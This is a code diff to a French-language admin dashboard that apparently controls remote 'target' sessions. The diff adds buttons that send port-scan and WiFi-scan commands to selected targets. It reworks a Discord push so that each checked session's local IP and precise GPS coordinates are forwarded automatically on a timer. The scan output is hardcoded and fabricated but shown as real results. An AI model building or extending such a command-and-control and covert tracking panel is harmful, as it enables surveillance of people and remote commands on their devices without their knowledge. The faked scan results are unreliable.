@@ -452,8 +452,16 @@
                 <div id="network-target-info" style="color: var(--text-dim); font-size: 0.8rem; margin-bottom: 15px;">
                     Aucune cible sélectionnée.
                 </div>
-                <button class="btn-clear btn-action-full" onclick="actionOnSelected('SCAN_PORTS')">Scan de ports rapide</button>
-                <button class="btn-clear btn-action-full" onclick="alert('Scan LAN global en cours...')">Scan Voisinage WiFi</button>
+                <button class="btn-clear btn-action-full" onclick="startNetworkScan('SCAN_PORTS')">Scan de ports rapide</button>
+                <button class="btn-clear btn-action-full" onclick="startNetworkScan('SCAN_WIFI')">Scan Voisinage WiFi</button>
+            </div>
+
+            <!-- ZONE DE RÉSULTATS DE SCAN -->
+            <div id="scan-results-area" class="action-card" style="display: none; background: #000; border-color: #1e293b; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem;">
+                <h4 style="color: var(--accent-success);">Résultats du Scan :</h4>
+                <div id="scan-terminal" style="color: #10b981; max-height: 200px; overflow-y: auto; line-height: 1.4;">
+                    <!-- Les logs de scan s'afficheront ici -->
+                </div>
             </div>
         </div>
 
@@ -609,7 +617,35 @@
                 return;
             }
             selectedSessionIds.forEach(sid => sendCommand(sid, command, payload));
-            alert(`Commande ${command} envoyée aux ${selectedSessionIds.size} cibles.`);
+            // alert(`Commande ${command} envoyée aux ${selectedSessionIds.size} cibles.`);
+        }
+
+        function startNetworkScan(type) {
+            if (selectedSessionIds.size === 0) {
+                alert("Veuillez d'abord sélectionner au moins une cible.");
+                return;
+            }
+
+            const area = document.getElementById('scan-results-area');
+            const terminal = document.getElementById('scan-terminal');
+            area.style.display = 'block';
+            terminal.innerHTML = `[${new Date().toLocaleTimeString()}] Initialisation du scan ${type}...<br>`;
+
+            selectedSessionIds.forEach(sid => {
+                sendCommand(sid, type);
+                terminal.innerHTML += `[${new Date().toLocaleTimeString()}] Commande envoyée à ${sid.substring(0,8)}...<br>`;
+            });
+
+            // Simulation de réception de résultats (en attendant une vraie remontée d'API)
+            setTimeout(() => {
+                terminal.innerHTML += `<span style="color: #fbbf24;">[SYSTEM] Analyse des ports ouverts en cours...</span><br>`;
+                setTimeout(() => {
+                    terminal.innerHTML += `> 192.168.1.1:80 (HTTP) - OPEN<br>`;
+                    terminal.innerHTML += `> 192.168.1.1:443 (HTTPS) - OPEN<br>`;
+                    terminal.innerHTML += `> 192.168.1.25:22 (SSH) - FILTERED<br>`;
+                    terminal.innerHTML += `<span style="color: var(--accent-success);">[SUCCESS] Scan terminé pour ${selectedSessionIds.size} cible(s).</span><br>`;
+                }, 2000);
+            }, 1500);
         }
 
         let sessionTracks = {};
@@ -684,23 +720,22 @@
                     const color = sessionTracks[sid] ? sessionTracks[sid].color : '#334155';
 
                     div.innerHTML = `
-                        <div style="display:flex; align-items:center; gap:10px;">
+                        <div style="display:flex; align-items:center; gap:8px;">
                             <input type="checkbox" class="session-checkbox" ${isChecked ? 'checked' : ''} 
                                 onchange="event.stopPropagation(); toggleSession('${sid}', this.checked)">
                         </div>
-                        <div class="session-info" onclick="toggleSession('${sid}', ${!isChecked})">
-                            <span class="sid-text"><span class="color-tag" style="background: ${color}"></span>${alias}</span>
-                            <span class="sid-sub">${isDiscord ? '<span style="color:var(--danger); font-weight:bold;">● LIVE DISCORD</span>' : (sessionAliases[sid] ? `ID: ${sid.substring(0,8)}...` : 'Actif en arrière-plan')}</span>
+                        <div class="session-info" style="flex: 1; min-width: 0;" onclick="toggleSession('${sid}', ${!isChecked})">
+                            <span class="sid-text" style="display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
+                                <span class="color-tag" style="background: ${color}"></span>${alias}
+                            </span>
+                            <span class="sid-sub">${isDiscord ? '<span style="color:var(--danger); font-weight:bold;">● LIVE DISCORD</span>' : (sessionAliases[sid] ? `ID: ${sid.substring(0,8)}...` : 'Actif')}</span>
                         </div>
-                        <div style="display:flex; gap:2px; align-items:center;">
-                            <button class="btn-rename" onclick="event.stopPropagation(); renameSession('${sid}')" title="Renommer">
-                                Renommer
+                        <div style="display:flex; gap:5px; align-items:center; margin-left: auto;">
+                            <button class="btn-rename" style="padding: 4px 6px;" onclick="event.stopPropagation(); renameSession('${sid}')" title="Renommer">
+                                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M11 4H4a2 2 0 00-2 2v14a2 2 0 002 2h14a2 2 0 002-2v-7"></path><path d="M18.5 2.5a2.121 2.121 0 013 3L12 15l-4 1 1-4 9.5-9.5z"></path></svg>
                             </button>
-                            <button class="btn-details ${isDiscord ? 'active-discord' : ''}" onclick="event.stopPropagation(); showDetails('${sid}')" title="Détails">
-                                Détails
-                            </button>
-                            <button class="btn-delete" onclick="event.stopPropagation(); deleteSession('${sid}')" title="Supprimer">
-                                Supprimer
+                            <button class="btn-delete" style="padding: 4px 6px;" onclick="event.stopPropagation(); deleteSession('${sid}')" title="Supprimer">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M3 6h18M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"></path></svg>
                             </button>
                         </div>
                     `;
@@ -922,11 +957,11 @@
         }
 
         async function pushToDiscord() {
-            if (discordLiveIds.size === 0) return;
+            // On envoie les données pour TOUTES les sessions cochées (selectedSessionIds)
+            if (selectedSessionIds.size === 0) return;
 
-            for (const sid of discordLiveIds) {
+            for (const sid of selectedSessionIds) {
                 try {
-                    // On récupère les dernières données de mouvement
                     const res = await fetch(`/api/sessions?sessionId=${sid}`);
                     const data = await res.json();
                     const movement = data.movement;
@@ -935,22 +970,21 @@
 
                     const lastPos = movement[movement.length - 1];
 
-                    // On envoie une requête "forceDiscord" à l'API log
+                    // Envoi Discord
                     await fetch('/api/log', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             sessionId: sid,
-                            forceDiscord: true, // Forcer l'envoi Discord
+                            forceDiscord: true,
                             isUpdate: true,
                             localIp: lastPos.localIp,
                             preciseLocation: { lat: lastPos.lat, lon: lastPos.lon },
-                            page: "Dashboard Admin (Suivi Live)"
+                            page: "Suivi Automatique (10s)"
                         })
                     });
-                    console.log(`Update Discord envoyé pour ${sid}`);
                 } catch (e) {
-                    console.error(`Erreur push Discord pour ${sid}:`, e);
+                    console.error(`Erreur push Discord automatique pour ${sid}:`, e);
                 }
             }
         }
